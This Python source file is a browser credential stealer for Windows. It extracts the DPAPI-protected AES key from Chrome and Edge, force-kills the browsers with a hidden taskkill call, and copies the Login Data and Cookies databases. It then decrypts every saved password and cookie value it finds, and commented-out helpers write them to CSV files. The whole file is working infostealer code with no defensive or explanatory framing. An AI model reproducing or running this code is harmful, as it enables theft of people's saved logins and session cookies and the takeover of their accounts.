import os
import re
import json
import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import subprocess

class browser:
    def __init__(self):
        self.homepath = os.environ['USERPROFILE']+r"\AppData\Local"
        self.browsers = [
            ["chrome.exe", self.homepath + r"\Google\Chrome\User Data"],
            ["msedge.exe", self.homepath + r"\Microsoft\Edge\User Data"],
            #D:\HackBrowserData-0.4.5\HackBrowserData-0.4.5\browser\browser_windows.go
            # ["brave.exe", self.homepath + r"\BraveSoftware\Brave-Browser\User Data"],#test this path for brave
        ]

        for i in self.browsers.copy():
            if not os.path.exists(i[1]):
                self.browsers.remove(i)
            else:
                key=self.GetAESKey(i[1] + r"\Local State")
                if key:
                    i.append(key)
                else:
                    self.browsers.remove(i)
    
    def GetAESKey(self,local_state_path):
        try:
            with open( local_state_path, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            return None

    def DecryptData(self, secret_key, ciphertext):
        try:
            iv = ciphertext[3:15]
            encrypted_data = ciphertext[15:]
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            decrypted_data = cipher.decrypt(encrypted_data)[:-16]
            try:
                return decrypted_data.decode('utf-8')
            except UnicodeDecodeError:
                return decrypted_data.hex()
        except Exception as e:
            try:
                return str(win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1])
            except Exception as e:
                return f"[Decryption error: {str(e)}]"
        
    def GetDBConnection(self,chrome_path,filename):
        try:
            shutil.copy2(chrome_path,filename ) 
            abc=sqlite3.connect(filename)
            return abc
        except Exception as e:
            return None
    
    def GetPasswords(self):
        passwords = []
        errors = []
        for browser_name,browser_path,secret_key in self.browsers:
            try:
                folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
                for folder in folders:
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(browser_path,folder))
                    self.KillBrowser(browser_name)
                    conn = self.GetDBConnection(chrome_path_login_db,"Loginvault.db")
                    if(conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        password_data = cursor.fetchall()
                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")
                        for index,login in enumerate(password_data):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if(username!="" and ciphertext!=""):
                                decrypted_password = self.DecryptData(secret_key,ciphertext)
                                passwords.append([browser_name,url, username, decrypted_password])
                    else:
                        errors.append([browser_name,"Error in getting database connection"])
            except Exception as e:
                errors.append([browser_name,"Error in getting passwords",str(e)])
        return {
            "passwords": passwords,
            "errors": errors
        }
    
    def GetDatetime(self,chromedate):
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return "Expired or Invalid Date"
    
    def KillBrowser(self, browser_name):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.call("taskkill /f /im %s" % browser_name, startupinfo=startupinfo)
            return True
        except Exception as e:
            print("[-][ERR] %s" % str(e))
            return False
         
    def GetCookies(self):
        cookies = []
        errors = []
        for browser_name,browser_path,secret_key in self.browsers:
            try:
                folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
                for folder in folders:
                    cookie_db = os.path.normpath(r"%s\%s\Network\Cookies"%(browser_path,folder))
                    self.KillBrowser(browser_name)
                    conn = self.GetDBConnection(cookie_db,"Cookies.db")
                    if(conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
                        decrypted_value="something went wrong"
                        cookies_data = cursor.fetchall()
                        cursor.close()
                        conn.close()
                        os.remove("Cookies.db")
                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cookies_data:
                            if not value:
                                decrypted_value = self.DecryptData(secret_key, encrypted_value)
                            else:
                                decrypted_value = encrypted_value
                            creation_utc = str(self.GetDatetime(creation_utc))
                            last_access_utc = str(self.GetDatetime(last_access_utc))
                            expires_utc = str(self.GetDatetime(expires_utc))
                            cookies.append([browser_name,host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc])
                    else:
                        errors.append([browser_name,"Error in getting database connection"])
            except Exception as e:
                errors.append([browser_name,"Error in getting cookies",str(e)])
        return {
            "cookies": cookies,
            "errors": errors
        }

# import pandas as pd
# def create_password_csv():
#     browser_obj = browser()
#     data = browser_obj.GetPasswords()
#     passwords=data["passwords"]
#     errors=data["errors"]
#     print(errors)
#     if type(passwords) == str:
#         return passwords
#     df = pd.DataFrame(passwords, columns=["Browser", "URL", "Username", "Password"])
#     df.to_csv("passwords.csv", index=False)
#     return "Passwords file created successfully"

# def create_cookies_csv():
#     browser_obj = browser()
#     data = browser_obj.GetCookies()
#     cookies=data["cookies"]
#     errors=data["errors"]
#     print(errors)
#     if type(cookies) == str:
#         return cookies
#     df = pd.DataFrame(cookies, columns=["Browser", "Host Key", "Name", "Value", "Creation UTC", "Last Access UTC", "Expires UTC"])
#     df.to_csv("cookies.csv", index=False)
#     return "Cookies file created successfully"

# print(create_password_csv())
# print(create_cookies_csv())